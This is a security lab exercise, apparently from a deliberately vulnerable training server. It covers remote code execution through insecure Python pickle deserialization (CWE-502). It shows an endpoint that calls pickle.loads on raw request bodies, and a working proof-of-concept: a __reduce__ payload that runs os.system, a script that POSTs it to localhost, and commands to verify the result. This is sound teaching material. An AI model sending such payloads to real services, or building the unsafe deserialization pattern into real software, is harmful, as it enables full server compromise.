# Lab 05: RCE via Insecure Deserialization (Pickle)

## Objective

Exploit insecure deserialization to achieve Remote Code Execution (RCE) by sending a crafted pickle payload to the server.

## Vulnerability Type

- **CWE-502** — Deserialization of Untrusted Data
- **Severity**: Critical

## Background

Python's `pickle` module is **insecure** because it can execute arbitrary Python code during deserialization. The `/tools/execute-pickle` endpoint accepts pickled objects without validation, enabling RCE.

### Vulnerable Code

**File**: `server/src/tools.py:execute_pickle()`

```python
@router.post("/execute-pickle")
async def execute_pickle(request: Request):
    body = await request.body()
    # CRITICAL: pickle.loads() can execute arbitrary code
    obj = pickle.loads(body)
    return {"status": "success", "result": str(obj)}
```

## Lab Exercise

### Prerequisites

```bash
# Install pickle payload generator (optional)
pip install ysoserial  # Note: Python version exists as pickletyzer
```

### Attack Steps

1. **Create malicious pickle payload**
   
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned.txt",))

payload = pickle.dumps(RCE())
```

2. **Send to server**

```bash
python3 << 'EOF'
import requests
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned.txt",))

payload = pickle.dumps(RCE())
response = requests.post(
    "http://localhost:8000/tools/execute-pickle",
    data=payload,
    headers={"Content-Type": "application/octet-stream"}
)
print(response.json())
EOF
```

3. **Verify code execution**

```bash
docker exec vulnmcp-server cat /tmp/pwned.txt
```

## Expected Behavior

**Without fix** (vulnerable):
```bash
$ curl -X POST --data-binary @payload.pkl http://localhost:8000/tools/execute-pickle
{"status": "success", "result": "..."}
# Code was executed
```

**With fix** (secure):
```bash
$ curl -X POST --data-binary @payload.pkl http://localhost:8000/tools/execute-pickle
{"error": "Serialization format not supported"}
```

## References

- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [OWASP: Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [Python: Pickle Security Warning](https://docs.python.org/3/library/pickle.html)
